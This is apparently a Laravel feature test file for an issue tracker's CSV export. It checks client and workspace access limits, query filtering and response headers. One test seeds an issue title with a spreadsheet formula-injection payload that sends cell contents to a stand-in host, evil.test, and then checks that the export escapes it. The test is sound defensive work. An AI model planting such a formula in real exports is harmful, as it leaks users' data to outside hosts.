<?php

namespace Tests\Feature;

use App\Enums\IssueVisibility;
use App\Enums\WorkspaceRole;
use App\Models\Issue;
use App\Models\Project;
use App\Models\User;
use App\Support\Tenancy\Tenancy;
use Illuminate\Foundation\Testing\RefreshDatabase;
use PHPUnit\Framework\Attributes\Test;
use Tests\TestCase;

class IssueExportTest extends TestCase
{
    use RefreshDatabase;

    /** @return array<int, string> */
    private function csv(\Illuminate\Testing\TestResponse $response): array
    {
        \ob_start();
        $response->sendContent();
        $body = (string) \ob_get_clean();

        return array_values(array_filter(explode("\n", str_replace("\r", '', $body))));
    }

    #[Test]
    public function staff_get_every_issue_they_can_see(): void
    {
        [$workspace, $staff] = $this->workspaceWithMember(WorkspaceRole::Member, 'acme');

        app(Tenancy::class)->run($workspace, function () {
            $project = Project::factory()->create(['key' => 'WEB']);

            Issue::factory()->create(['project_id' => $project->id, 'title' => 'Pay now does nothing']);
            Issue::factory()->create(['project_id' => $project->id, 'title' => 'Logo is squashed']);
        });

        $rows = $this->csv(
            $this->actingAs($staff)->get($this->workspaceUrl($workspace, '/issues/export'))->assertOk()
        );

        $this->assertStringContainsString('key,title,status', $rows[0]);
        $this->assertCount(3, $rows); // header plus two
        $this->assertStringContainsString('Pay now does nothing', implode("\n", $rows));
    }

    #[Test]
    public function the_export_obeys_the_same_query_as_the_list(): void
    {
        // Otherwise the file disagrees with the screen, and the disagreement is
        // always discovered at the worst moment.
        [$workspace, $staff] = $this->workspaceWithMember(WorkspaceRole::Member, 'acme');

        app(Tenancy::class)->run($workspace, function () {
            $web = Project::factory()->create(['key' => 'WEB', 'slug' => 'web']);
            $app = Project::factory()->create(['key' => 'APP', 'slug' => 'app']);

            Issue::factory()->create(['project_id' => $web->id, 'title' => 'On the website']);
            Issue::factory()->create(['project_id' => $app->id, 'title' => 'In the app']);
        });

        $body = implode("\n", $this->csv(
            $this->actingAs($staff)
                ->get($this->workspaceUrl($workspace, '/issues/export?q='.urlencode('project:web')))
                ->assertOk()
        ));

        $this->assertStringContainsString('On the website', $body);
        $this->assertStringNotContainsString('In the app', $body);
    }

    #[Test]
    public function a_client_exports_only_what_they_could_already_see(): void
    {
        // An export is a listing, and a listing is the classic way a leak leaves a
        // building. It must not be a second, laxer route to the same data.
        [$workspace, $staff] = $this->workspaceWithMember(WorkspaceRole::Member, 'acme');

        $client = User::factory()->create();
        $workspace->members()->attach($client->id, [
            'role' => WorkspaceRole::Client->value,
            'joined_at' => now(),
        ]);

        $granted = app(Tenancy::class)->run($workspace, function () {
            $granted = Project::factory()->create(['key' => 'MINE']);
            $other = Project::factory()->create(['key' => 'OTHER']);

            Issue::factory()->clientVisible()->create([
                'project_id' => $granted->id,
                'title' => 'Something they reported',
            ]);

            Issue::factory()->create([
                'project_id' => $granted->id,
                'title' => 'Internal note about their budget',
                'visibility' => IssueVisibility::Internal,
            ]);

            Issue::factory()->clientVisible()->create([
                'project_id' => $other->id,
                'title' => 'A different clients problem',
            ]);

            return $granted;
        });

        $granted->clients()->attach($client->id, ['role' => 'client_manager']);

        $body = implode("\n", $this->csv(
            $this->actingAs($client)->get($this->workspaceUrl($workspace, '/issues/export'))->assertOk()
        ));

        $this->assertStringContainsString('Something they reported', $body);
        $this->assertStringNotContainsString('Internal note about their budget', $body);
        $this->assertStringNotContainsString('A different clients problem', $body);
    }

    #[Test]
    public function issues_from_another_workspace_never_appear(): void
    {
        [$acme, $staff] = $this->workspaceWithMember(WorkspaceRole::Member, 'acme');
        [$globex] = $this->workspaceWithMember(WorkspaceRole::Member, 'globex');

        app(Tenancy::class)->run($globex, fn () => Issue::factory()->create([
            'project_id' => Project::factory()->create(['key' => 'GLX'])->id,
            'title' => 'Belongs to somebody else entirely',
        ]));

        app(Tenancy::class)->run($acme, fn () => Issue::factory()->create([
            'project_id' => Project::factory()->create(['key' => 'WEB'])->id,
            'title' => 'Ours',
        ]));

        $body = implode("\n", $this->csv(
            $this->actingAs($staff)->get($this->workspaceUrl($acme, '/issues/export'))->assertOk()
        ));

        $this->assertStringContainsString('Ours', $body);
        $this->assertStringNotContainsString('Belongs to somebody else entirely', $body);
    }

    #[Test]
    public function a_title_cannot_smuggle_a_spreadsheet_formula(): void
    {
        // Titles are written by whoever hit the bug. A cell starting with = is run as
        // a formula the moment the file is opened, and some of them reach the network.
        [$workspace, $staff] = $this->workspaceWithMember(WorkspaceRole::Member, 'acme');

        app(Tenancy::class)->run($workspace, fn () => Issue::factory()->create([
            'project_id' => Project::factory()->create(['key' => 'WEB'])->id,
            'title' => '=HYPERLINK("https://evil.test?"&A1,"Click me")',
        ]));

        $body = implode("\n", $this->csv(
            $this->actingAs($staff)->get($this->workspaceUrl($workspace, '/issues/export'))->assertOk()
        ));

        $this->assertStringNotContainsString(',=HYPERLINK', $body);
        $this->assertStringContainsString("'=HYPERLINK", $body);
    }

    #[Test]
    public function a_guest_gets_nothing(): void
    {
        [$workspace] = $this->workspaceWithMember(slug: 'acme');

        $this->get($this->workspaceUrl($workspace, '/issues/export'))->assertRedirect();
    }

    #[Test]
    public function the_file_says_it_is_a_csv_and_will_not_be_sniffed_as_anything_else(): void
    {
        [$workspace, $staff] = $this->workspaceWithMember(WorkspaceRole::Member, 'acme');

        $response = $this->actingAs($staff)
            ->get($this->workspaceUrl($workspace, '/issues/export'))
            ->assertOk();

        $this->assertStringContainsString('text/csv', $response->headers->get('content-type'));
        $this->assertSame('nosniff', $response->headers->get('x-content-type-options'));
        $this->assertStringContainsString('buggie-issues-', $response->headers->get('content-disposition'));
    }
}
